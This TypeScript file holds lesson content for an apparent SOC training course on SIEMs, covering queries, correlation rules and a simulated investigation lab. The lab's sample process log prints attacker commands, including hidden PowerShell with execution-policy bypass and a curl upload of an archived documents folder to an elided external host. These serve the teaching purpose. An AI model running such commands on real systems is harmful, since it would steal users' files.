import { LessonContent } from "../../lessonContent";

export const module4: LessonContent[] = [
      // Module 4: SIEM Fundamentals
  {
    id: "4.1",
    courseId: "soc-fundamentals",
    title: "What is a SIEM?",
    content: `
# What is a SIEM?

A Security Information and Event Management (SIEM) system is the cornerstone of modern security operations. It aggregates, correlates, and analyzes log data from across your environment to detect threats.

## SIEM Definition

**SIEM** = **S**ecurity **I**nformation and **E**vent **M**anagement

A SIEM combines two capabilities:
- **SIM (Security Information Management)**: Log collection, storage, and compliance reporting
- **SEM (Security Event Management)**: Real-time monitoring, correlation, and alerting

## Core SIEM Functions

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                        SIEM PLATFORM                             │
├─────────────┬───────────────┬───────────────┬──────────────────┤
│  Collection │   Parsing &   │  Correlation  │   Alerting &     │
│  & Ingestion│ Normalization │   & Rules     │   Dashboards     │
├─────────────┼───────────────┼───────────────┼──────────────────┤
│ • Agents    │ • Field       │ • Rules       │ • Alerts         │
│ • Syslog    │   extraction  │ • Use cases   │ • Dashboards     │
│ • APIs      │ • Enrichment  │ • Baselines   │ • Reports        │
│ • Beats     │ • Tagging     │ • Anomalies   │ • Investigations │
└─────────────┴───────────────┴───────────────┴──────────────────┘
\`\`\`

## How a SIEM Works

### 1. Data Collection

\`\`\`
Sources:
┌──────────────┐  ┌──────────────┐  ┌──────────────┐
│   Endpoints  │  │   Network    │  │    Cloud     │
│   (Agents)   │  │   (Syslog)   │  │    (APIs)    │
└──────┬───────┘  └──────┬───────┘  └──────┬───────┘
       │                 │                 │
       └─────────────────┼─────────────────┘
                         ↓
                   ┌───────────┐
                   │   SIEM    │
                   └───────────┘
\`\`\`

### 2. Parsing & Normalization

Raw logs are transformed into structured, searchable data:

**Before (Raw):**
\`\`\`
Jan 15 10:30:00 server01 sshd[12345]: Failed password for admin from 192.168.1.100 port 54321 ssh2
\`\`\`

**After (Normalized):**
\`\`\`json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "source": "server01",
  "event_type": "authentication",
  "outcome": "failure",
  "user": "admin",
  "source_ip": "192.168.1.100",
  "service": "ssh"
}
\`\`\`

### 3. Correlation & Detection

The SIEM applies rules to identify threats:

**Simple Rule:**
\`\`\`
IF event_type = "authentication" 
AND outcome = "failure" 
AND count > 5 within 5 minutes
THEN alert "Potential Brute Force"
\`\`\`

**Complex Correlation:**
\`\`\`
IF (failed_logins > 5 from source_ip)
AND THEN (successful_login from same source_ip)
AND THEN (new_process = "powershell.exe" on same host)
WITHIN 10 minutes
THEN alert "Successful Brute Force with Post-Exploitation"
\`\`\`

### 4. Alerting & Response

When rules match, the SIEM:
- Creates an alert with severity
- Enriches with context
- Notifies analysts
- Optionally triggers automation (SOAR)

## Major SIEM Platforms

| Platform | Type | Strengths |
|----------|------|-----------|
| **Splunk** | Commercial | Powerful SPL, extensive ecosystem |
| **Microsoft Sentinel** | Cloud | Azure integration, AI/ML |
| **Elastic Security** | Open Source | Scalable, free tier available |
| **IBM QRadar** | Commercial | Strong correlation |
| **Google Chronicle** | Cloud | Massive scale, fast search |
| **LogRhythm** | Commercial | Built-in SOAR |
| **Sumo Logic** | Cloud | Cloud-native, ML |

## SIEM Architecture

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                         SIEM Architecture                        │
│                                                                  │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │
│  │   Indexers  │    │   Search    │    │  Dashboard  │         │
│  │   (Store)   │←───│   (Query)   │←───│   (View)    │←─ User  │
│  └──────┬──────┘    └─────────────┘    └─────────────┘         │
│         ↑                                                       │
│  ┌──────┴──────┐                                                │
│  │   Parsers   │                                                │
│  │ (Normalize) │                                                │
│  └──────┬──────┘                                                │
│         ↑                                                       │
│  ┌──────┴──────┐                                                │
│  │ Collectors  │ ← Logs from endpoints, network, cloud          │
│  │  (Ingest)   │                                                │
│  └─────────────┘                                                │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## SIEM Value for SOC

### Detection Capabilities
- Real-time alerting on threats
- Pattern matching across sources
- Anomaly detection
- Threat intelligence integration

### Investigation Support
- Centralized log search
- Timeline reconstruction
- Correlation of related events
- Evidence preservation

### Compliance & Reporting
- Audit trail maintenance
- Compliance dashboards
- Automated reporting
- Retention policies

## Common SIEM Challenges

| Challenge | Description | Mitigation |
|-----------|-------------|------------|
| Alert Fatigue | Too many alerts | Tuning, prioritization |
| Data Volume | Massive log volumes | Tiered storage, filtering |
| False Positives | Noise in alerts | Rule tuning, ML |
| Coverage Gaps | Missing log sources | Onboarding plan |
| Skill Gap | Complex queries | Training, playbooks |
    `,
    keyTakeaways: [
      "SIEM combines log collection, correlation, and alerting in one platform",
      "Raw logs are normalized into structured, searchable data",
      "Correlation rules detect threats by matching patterns across events",
      "Major platforms include Splunk, Sentinel, Elastic, QRadar, and Chronicle",
      "Common challenges include alert fatigue, data volume, and false positives"
    ]
  },
  {
    id: "4.2",
    courseId: "soc-fundamentals",
    title: "SIEM Navigation & Interface",
    content: `
# SIEM Navigation & Interface

Efficiently navigating your SIEM is crucial for effective threat detection and investigation. This lesson covers the common interface elements you'll encounter across SIEM platforms.

## Common SIEM Interface Elements

### Main Navigation Areas

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│  Logo   [Search] [Alerts] [Dashboards] [Reports] [Settings]    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                    MAIN WORKSPACE                        │   │
│  │                                                          │   │
│  │  • Search/Query Interface                               │   │
│  │  • Alert Queue                                          │   │
│  │  • Dashboards                                           │   │
│  │  • Investigation Workspace                              │   │
│  │                                                          │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                  │
│  [Time Picker]  [Filters]  [Export]  [Save]                     │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## Key Interface Components

### 1. Search Bar

The search bar is where you'll spend most of your time:

**Features:**
- Query input field
- Time range selector
- Field suggestions/autocomplete
- Search history
- Saved searches

**Example Search:**
\`\`\`
index=security sourcetype=WinEventLog EventCode=4625 
| stats count by src_ip, user
| where count > 10
\`\`\`

### 2. Alert Queue

Where you'll see triggered alerts:

| Column | Description |
|--------|-------------|
| Severity | Critical/High/Medium/Low |
| Alert Name | Detection rule name |
| Time | When it triggered |
| Status | New/In Progress/Closed |
| Assignee | Who's working it |
| Asset | Affected system |
| Source | Origin of threat |

### 3. Dashboards

Visual displays of security metrics:

**Common Dashboard Types:**
- **Overview**: High-level security posture
- **Threat Detection**: Alert trends, top threats
- **Network**: Traffic patterns, connections
- **Authentication**: Login activity, failures
- **Endpoint**: Process, file activity

**Dashboard Elements:**
\`\`\`
┌───────────────────────────────────────────────────────────┐
│ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐          │
│ │ Total Alerts│ │ Critical    │ │ Open Cases  │          │
│ │    1,234    │ │     23      │ │     45      │          │
│ └─────────────┘ └─────────────┘ └─────────────┘          │
│                                                           │
│ ┌─────────────────────────────────────────────────────┐  │
│ │              Alert Trend (7 days)                    │  │
│ │  ▃▅▆▇▅▄▃                                            │  │
│ └─────────────────────────────────────────────────────┘  │
│                                                           │
│ ┌─────────────────────┐ ┌─────────────────────────────┐  │
│ │   Top Alert Types   │ │     Top Affected Assets     │  │
│ │   • Brute Force 45% │ │     • WKS-001              │  │
│ │   • Malware 30%     │ │     • SRV-DB01             │  │
│ │   • Policy 25%      │ │     • FW-EDGE01            │  │
│ └─────────────────────┘ └─────────────────────────────┘  │
└───────────────────────────────────────────────────────────┘
\`\`\`

### 4. Investigation Workspace

Where you dig into specific incidents:

**Features:**
- Event timeline
- Related events
- Entity details (users, hosts, IPs)
- Evidence collection
- Notes and collaboration

## Time Range Selection

Critical for scoping your searches:

| Option | Use Case |
|--------|----------|
| Last 15 min | Real-time monitoring |
| Last 1 hour | Recent alert investigation |
| Last 24 hours | Daily review |
| Last 7 days | Trend analysis |
| Custom range | Incident investigation |

**Tip:** Start broad, then narrow down based on findings.

## Filtering and Field Selection

### Common Filters

\`\`\`
Filter by:
├── Severity: Critical, High, Medium, Low
├── Status: New, In Progress, Closed
├── Source Type: Windows, Linux, Firewall, etc.
├── Asset: Specific hosts or groups
├── User: Specific users or groups
└── Time: Custom ranges
\`\`\`

### Field Browser

Most SIEMs have a field browser showing:
- Available fields
- Field values
- Value counts
- Quick filtering

## Workflow Tips

### Efficient Navigation

1. **Bookmark common searches** - Save frequently used queries
2. **Create personal dashboards** - Track what matters to you
3. **Use keyboard shortcuts** - Faster than clicking
4. **Leverage templates** - Start from existing queries
5. **Set up alert notifications** - Don't miss critical alerts

### Common Keyboard Shortcuts

| Action | Shortcut |
|--------|----------|
| Search | Ctrl/Cmd + Enter |
| New search | Ctrl/Cmd + N |
| Save search | Ctrl/Cmd + S |
| Time range | Ctrl/Cmd + T |
| Toggle sidebar | Ctrl/Cmd + B |
    `,
    keyTakeaways: [
      "The search bar and time picker are your primary investigation tools",
      "Alert queues show triggered detections with severity and status",
      "Dashboards provide visual summaries of security metrics",
      "Always start with appropriate time ranges and refine as needed",
      "Save common searches and create personal dashboards for efficiency"
    ]
  },
  {
    id: "4.3",
    courseId: "soc-fundamentals",
    title: "Basic Search Queries",
    content: `
# Basic Search Queries

Learning to write effective SIEM queries is essential for SOC analysts. This lesson covers fundamental search concepts that apply across most SIEM platforms.

## Search Query Basics

### Query Structure

Most SIEM queries follow this pattern:

\`\`\`
[DATA SOURCE] [FILTERS] [TRANSFORMATIONS] [OUTPUT]
\`\`\`

**Example (Splunk SPL):**
\`\`\`
index=security sourcetype=WinEventLog EventCode=4625 
| stats count by src_ip 
| sort -count 
| head 10
\`\`\`

**Breakdown:**
- \`index=security\` - Data source
- \`sourcetype=WinEventLog EventCode=4625\` - Filters
- \`stats count by src_ip\` - Transformation (aggregation)
- \`sort -count | head 10\` - Output formatting

## Common Query Patterns

### 1. Simple Filtering

Find events matching specific criteria:

\`\`\`
# All failed logins
EventCode=4625

# Failed logins for specific user
EventCode=4625 user="admin"

# Failed logins from specific IP
EventCode=4625 src_ip="192.168.1.100"

# Combining filters
EventCode=4625 user="admin" src_ip="192.168.1.100"
\`\`\`

### 2. Wildcard Searches

Match patterns with wildcards:

\`\`\`
# Any user starting with "admin"
user=admin*

# Any domain ending in .xyz
domain=*.xyz

# Contains "password" anywhere
*password*
\`\`\`

### 3. Time-Based Queries

Scope searches to specific time ranges:

\`\`\`
# Last 24 hours
earliest=-24h latest=now

# Specific date range
earliest="01/15/2024:00:00:00" latest="01/16/2024:00:00:00"

# Last business day
earliest=-1d@d latest=@d
\`\`\`

### 4. Aggregation Queries

Summarize data:

\`\`\`
# Count events by user
| stats count by user

# Count events by source IP and user
| stats count by src_ip, user

# Get earliest and latest time by user
| stats earliest(_time) as first_seen, latest(_time) as last_seen by user

# Calculate average, min, max
| stats avg(bytes) min(bytes) max(bytes) by src_ip
\`\`\`

### 5. Sorting and Limiting

Control output:

\`\`\`
# Sort by count descending
| sort -count

# Sort by count ascending
| sort count

# Limit to top 10
| head 10

# Limit to bottom 10
| tail 10
\`\`\`

## Security Use Case Queries

### Brute Force Detection

\`\`\`
# Find IPs with many failed logins
EventCode=4625
| stats count by src_ip
| where count > 10
| sort -count
\`\`\`

### Successful Login After Failures

\`\`\`
# Track failed then successful logins
(EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failures,
        count(eval(EventCode=4624)) as successes by src_ip, user
| where failures > 5 AND successes > 0
\`\`\`

### Suspicious Process Execution

\`\`\`
# PowerShell with encoded commands
EventCode=4688 
| search CommandLine="*-enc*" OR CommandLine="*-encoded*"
| table _time, ComputerName, User, CommandLine
\`\`\`

### Outbound Connection Analysis

\`\`\`
# Large outbound transfers
action=allowed direction=outbound
| stats sum(bytes_out) as total_bytes by src_ip, dest_ip
| where total_bytes > 100000000
| sort -total_bytes
\`\`\`

### User Activity Timeline

\`\`\`
# All activity for a specific user
user="jsmith"
| sort _time
| table _time, src_ip, action, dest, details
\`\`\`

## Query Building Tips

### Start Broad, Then Narrow

\`\`\`
Step 1: EventCode=4625
Step 2: EventCode=4625 | stats count by src_ip
Step 3: EventCode=4625 | stats count by src_ip | where count > 10
Step 4: EventCode=4625 | stats count by src_ip | where count > 10 | sort -count | head 10
\`\`\`

### Use Field Discovery

Before querying:
1. Check what fields are available
2. Understand field names and values
3. Verify data types

### Test Incrementally

Build queries step by step:
\`\`\`
# Test each part
EventCode=4625                              # Check base filter
EventCode=4625 | stats count               # Verify count works
EventCode=4625 | stats count by src_ip     # Add grouping
\`\`\`

## Common Operators

| Operator | Description | Example |
|----------|-------------|---------|
| = | Equals | user="admin" |
| != | Not equals | action!="allowed" |
| > < | Greater/Less than | count > 10 |
| AND | Both conditions | user="admin" AND action="login" |
| OR | Either condition | EventCode=4624 OR EventCode=4625 |
| NOT | Exclude | NOT action="allowed" |
| IN | Multiple values | EventCode IN (4624, 4625, 4648) |
    `,
    keyTakeaways: [
      "Queries follow a pattern: data source → filters → transformations → output",
      "Use wildcards (*) for pattern matching and partial searches",
      "Aggregation commands (stats, count, sum) summarize large datasets",
      "Always start broad and narrow down based on results",
      "Build queries incrementally and test each step"
    ],
    practicalExercise: {
      title: "Write SIEM Queries",
      description: "Practice writing queries for common security scenarios.",
      steps: [
        "Write a query to find all failed logins in the last 24 hours",
        "Modify it to group by source IP and count occurrences",
        "Filter to show only IPs with more than 5 failures",
        "Add user information to the output",
        "Sort by count and limit to top 10"
      ]
    }
  },
  {
    id: "4.4",
    courseId: "soc-fundamentals",
    title: "Correlation Rules & Alerts",
    content: `
# Correlation Rules & Alerts

Correlation rules are the detection logic that transforms raw events into actionable security alerts. Understanding how they work helps you investigate alerts effectively and suggest improvements.

## What is Correlation?

**Correlation** connects related events to identify patterns that individual events wouldn't reveal.

### Single Event vs. Correlation

**Single Event Detection:**
\`\`\`
Event: Failed login
Action: Maybe alert, maybe not (too noisy)
\`\`\`

**Correlated Detection:**
\`\`\`
Pattern: 10+ failed logins → successful login → PowerShell execution
Within: 5 minutes
From: Same source IP
Action: HIGH priority alert
\`\`\`

## Correlation Rule Components

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                     CORRELATION RULE                             │
├─────────────────────────────────────────────────────────────────┤
│  Trigger Conditions                                              │
│  ├── Event Type(s): What events to look for                     │
│  ├── Threshold: How many occurrences                            │
│  ├── Time Window: Within what timeframe                         │
│  └── Grouping: By what fields (IP, user, host)                  │
├─────────────────────────────────────────────────────────────────┤
│  Alert Configuration                                             │
│  ├── Severity: Critical/High/Medium/Low                         │
│  ├── Name: Descriptive alert title                              │
│  ├── Description: What was detected                             │
│  └── MITRE ATT&CK: Mapped technique                             │
├─────────────────────────────────────────────────────────────────┤
│  Response Actions                                                │
│  ├── Notification: Email, Slack, ticket                         │
│  ├── Enrichment: Add context automatically                      │
│  └── Automation: Trigger SOAR playbook                          │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## Types of Correlation Rules

### 1. Threshold-Based

Trigger when count exceeds limit:

\`\`\`
Rule: Brute Force Detection
Condition: Failed logins > 10 in 5 minutes
Group By: Source IP
Severity: Medium
\`\`\`

### 2. Sequence-Based

Events must occur in order:

\`\`\`
Rule: Successful Attack Chain
Sequence:
  1. Failed logins (>5)
  2. Successful login
  3. Process execution
Time Window: 10 minutes
Group By: Source IP, Target Host
Severity: High
\`\`\`

### 3. Statistical/Anomaly

Deviation from baseline:

\`\`\`
Rule: Unusual Data Transfer
Condition: Outbound bytes > 3 standard deviations from baseline
Baseline: 30-day rolling average
Group By: Source IP
Severity: Medium
\`\`\`

### 4. Threat Intelligence

Match against known bad indicators:

\`\`\`
Rule: Known Malicious IP
Condition: Connection to IP in threat feed
Feeds: AlienVault, Abuse.ch, Internal
Severity: High
\`\`\`

## Alert Severity Levels

| Level | Criteria | Response Time |
|-------|----------|---------------|
| **Critical** | Active breach, data exfil, ransomware | Immediate |
| **High** | Confirmed malware, successful exploitation | < 1 hour |
| **Medium** | Suspicious activity, policy violation | < 4 hours |
| **Low** | Informational, minor anomaly | < 24 hours |

## Example Correlation Rules

### Rule 1: Password Spray Attack

\`\`\`yaml
name: Password Spray Attack Detected
description: Multiple users targeted with same password
mitre_attack: T1110.003

conditions:
  event_type: authentication_failure
  threshold: 
    unique_users: > 10
    failed_attempts: > 20
  time_window: 10 minutes
  group_by: source_ip

severity: HIGH

response:
  - create_alert
  - enrich_with_threat_intel
  - notify_channel: #soc-alerts
\`\`\`

### Rule 2: Lateral Movement Detection

\`\`\`yaml
name: Potential Lateral Movement
description: Same account authenticating to multiple systems
mitre_attack: T1021

conditions:
  event_type: successful_authentication
  logon_type: [3, 10]  # Network, RDP
  threshold:
    unique_hosts: > 5
  time_window: 30 minutes
  group_by: username

severity: MEDIUM

response:
  - create_alert
  - gather_user_context
\`\`\`

### Rule 3: Data Exfiltration Indicator

\`\`\`yaml
name: Large Outbound Transfer
description: Unusually large data transfer to external IP
mitre_attack: T1041

conditions:
  event_type: network_connection
  direction: outbound
  destination: external
  threshold:
    bytes_out: > 100MB
  time_window: 1 hour
  group_by: source_ip, destination_ip

exclusions:
  - destination_ip IN known_cloud_services
  - destination_ip IN backup_targets

severity: MEDIUM

response:
  - create_alert
  - capture_network_metadata
\`\`\`

## Alert Tuning

### Common Tuning Approaches

1. **Whitelist known-good activity**
   - Vulnerability scanners
   - Backup systems
   - Service accounts

2. **Adjust thresholds**
   - Too many alerts? Raise threshold
   - Missing detections? Lower threshold

3. **Refine time windows**
   - Too short = fragmented detection
   - Too long = delayed alerts

4. **Add context filters**
   - Business hours vs. off-hours
   - Production vs. development
   - Privileged vs. standard users

### Tuning Request Format

When requesting tuning:

\`\`\`
Rule Name: Brute Force Detection
Current Issue: High false positive rate
Proposed Change: Add whitelist for vulnerability scanner IPs
Business Justification: Scanner IPs (192.168.100.0/24) trigger 50+ alerts/day
Risk Assessment: Low - these are known internal scanners
\`\`\`
    `,
    keyTakeaways: [
      "Correlation connects related events to identify attack patterns",
      "Rules can be threshold-based, sequence-based, statistical, or TI-driven",
      "Severity levels drive response urgency and SLA requirements",
      "Alert tuning reduces false positives while maintaining detection",
      "Document tuning requests with business justification and risk assessment"
    ]
  },
  {
    id: "4.5",
    courseId: "soc-fundamentals",
    title: "Hands-On: SIEM Investigation Lab",
    content: `
# Hands-On: SIEM Investigation Lab

Practice your SIEM skills by investigating a realistic security scenario. This lab simulates the workflow you'll follow as a SOC analyst.

## Lab Scenario

**Alert Received:**
\`\`\`
Alert: Potential Data Exfiltration
Severity: High
Time: 2024-01-15 14:30:00 UTC
Source Host: WKS-SALES03
Source IP: 192.168.10.103
Destination: 185.234.72.50:443
Bytes Out: 150 MB
\`\`\`

**Your Task:**
Investigate this alert to determine if it's a true positive and understand the full scope of the incident.

## Investigation Workflow

### Phase 1: Alert Context

**Step 1: Review Alert Details**

Questions to answer:
- What triggered this alert?
- What is the source and destination?
- What is the timeline?
- Who is associated with this system?

**Query 1: Get alert context**
\`\`\`
host="WKS-SALES03" earliest=-2h latest=+1h
| sort _time
| table _time, event_type, src_ip, dest_ip, user, action, bytes
\`\`\`

### Phase 2: Source Investigation

**Step 2: Investigate the Source Host**

**Query 2: Recent activity on affected host**
\`\`\`
host="WKS-SALES03" earliest=-24h
| stats count by event_type
| sort -count
\`\`\`

**Query 3: User activity**
\`\`\`
host="WKS-SALES03" earliest=-24h
| stats values(user) as users, count by event_type
\`\`\`

**Query 4: Process execution**
\`\`\`
host="WKS-SALES03" EventCode=4688 earliest=-24h
| table _time, User, NewProcessName, CommandLine, ParentProcessName
| sort _time
\`\`\`

### Phase 3: Destination Investigation

**Step 3: Analyze the Destination**

**Query 5: Historical connections to destination**
\`\`\`
dest_ip="185.234.72.50" earliest=-30d
| stats count by src_ip, host
| sort -count
\`\`\`

**Query 6: Threat intelligence lookup**
\`\`\`
| inputlookup threat_intel 
| search ip="185.234.72.50"
\`\`\`

**External OSINT:**
- Check VirusTotal, AbuseIPDB
- Review domain registration (WHOIS)
- Check passive DNS history

### Phase 4: Timeline Reconstruction

**Step 4: Build the Attack Timeline**

**Query 7: All events for affected user/host**
\`\`\`
(host="WKS-SALES03" OR user="mwilson") earliest=-48h
| sort _time
| table _time, host, event_type, action, details
\`\`\`

## Lab Data (Simulated Results)

### Query Results

**Process Execution (Query 4):**
\`\`\`
13:00:00 | mwilson | outlook.exe | - | explorer.exe
13:15:00 | mwilson | WINWORD.EXE | "Q4_Report.docm" | explorer.exe
13:15:05 | mwilson | powershell.exe | powershell -w hidden -ep bypass | WINWORD.EXE
13:15:10 | mwilson | cmd.exe | cmd /c whoami | powershell.exe
13:15:15 | mwilson | cmd.exe | cmd /c net user | powershell.exe
13:16:00 | SYSTEM | svchost.exe | - | services.exe
14:00:00 | mwilson | 7z.exe | 7z a archive.7z C:\\Users\\mwilson\\Documents | cmd.exe
14:30:00 | mwilson | curl.exe | curl -X POST -F "file=@archive.7z" https://... | cmd.exe
\`\`\`

**Threat Intel (Query 6):**
\`\`\`
IP: 185.234.72.50
Category: Command and Control
Confidence: High
Associated Malware: Cobalt Strike
First Seen: 2024-01-10
\`\`\`

**Network Connections:**
\`\`\`
14:00:00 | WKS-SALES03 | 185.234.72.50:443 | 1024 bytes (beacon)
14:05:00 | WKS-SALES03 | 185.234.72.50:443 | 1024 bytes (beacon)
14:10:00 | WKS-SALES03 | 185.234.72.50:443 | 1024 bytes (beacon)
14:30:00 | WKS-SALES03 | 185.234.72.50:443 | 150 MB (exfiltration)
\`\`\`

## Analysis

### Attack Chain Reconstruction

\`\`\`
13:15 - User opens malicious Word doc (phishing)
      ↓
13:15 - Macro executes PowerShell (execution)
      ↓
13:15 - Reconnaissance commands (discovery)
      ↓
14:00 - Beacon established to C2 (command and control)
      ↓
14:00 - Documents archived with 7z (collection)
      ↓
14:30 - Archive uploaded to C2 (exfiltration)
\`\`\`

### MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Initial Access | T1566.001 Phishing Attachment | Word doc opened |
| Execution | T1059.001 PowerShell | Hidden PowerShell |
| Discovery | T1033 System Owner | whoami command |
| Collection | T1560.001 Archive | 7z.exe usage |
| C2 | T1071.001 Web Protocols | HTTPS to C2 IP |
| Exfiltration | T1041 Exfil Over C2 | 150MB upload |

## Your Investigation Report

**Incident Summary:**
[True Positive - Confirmed malware infection with data exfiltration]

**Timeline:**
[Include key events with timestamps]

**Affected Assets:**
- Host: WKS-SALES03
- User: mwilson
- Data: User documents (150MB exfiltrated)

**Indicators of Compromise:**
- C2 IP: 185.234.72.50
- Malicious file: Q4_Report.docm
- Tools: PowerShell, 7z.exe, curl.exe

**Recommended Actions:**
1. Isolate WKS-SALES03 immediately
2. Block 185.234.72.50 at firewall
3. Reset mwilson's credentials
4. Preserve evidence for forensics
5. Search for similar activity across environment
    `,
    keyTakeaways: [
      "Follow a structured investigation workflow: context → source → destination → timeline",
      "Build queries incrementally to understand the scope of activity",
      "Correlate SIEM data with external threat intelligence for context",
      "Map findings to MITRE ATT&CK to understand the attack chain",
      "Document everything in a structured incident report"
    ],
    practicalExercise: {
      title: "Complete the SIEM Investigation",
      description: "Use the lab data to complete a full investigation report.",
      steps: [
        "Review all query results and identify suspicious activity",
        "Build a complete timeline of the attack",
        "Map each phase to MITRE ATT&CK techniques",
        "Extract all indicators of compromise",
        "Write recommended containment and remediation actions"
      ]
    }
  },
  {
    id: "4.5",
    courseId: "soc-fundamentals",
    title: "SIEM & Alert Triage Quiz",
    content: `
# SIEM & Alert Triage Quiz

Test your SIEM querying skills and alert triage methodology.

## Quiz Overview

This quiz covers the SIEM and alert triage concepts from Module 4:
- SIEM architecture and components
- Query languages and search techniques
- Correlation rules and alerting
- Alert triage methodology
- Dashboard interpretation

## Instructions

1. **Duration**: 30 minutes
2. **Questions**: 5 multiple-choice questions
3. **Passing Score**: 75% (4 out of 5 questions)
4. **Attempts**: Unlimited - retake if needed

## Key Topics to Review

Before taking the quiz, make sure you understand:
- SIEM fundamentals and architecture
- Query languages (SPL, KQL, SQL)
- Correlation rule logic
- Alert triage process
- Dashboard metrics and visualization
- Data aggregation and analysis

## Taking the Quiz

Click the "Start Quiz" button below when you're ready. The quiz will cover:
- SIEM concepts and terminology
- Query language syntax and usage
- Correlation rule development
- Alert prioritization and triage
- Dashboard interpretation

Good luck! SIEM skills are essential for modern SOC operations.
    `,
    keyTakeaways: [
      "SIEMs centralize log collection and analysis for comprehensive visibility",
      "Query languages enable powerful data analysis and threat hunting",
      "Correlation rules automate detection of complex attack patterns",
      "Systematic alert triage ensures critical threats are prioritized",
      "Dashboards provide real-time visibility into security posture"
    ],
    practicalExercise: {
      title: "Quiz Preparation",
      description: "Review SIEM and alert triage concepts before taking the quiz.",
      steps: [
        "Study SIEM architecture and components",
        "Practice basic query syntax",
        "Review correlation rule concepts",
        "Learn alert triage methodology",
        "Take the quiz when ready"
      ]
    }
  }
];
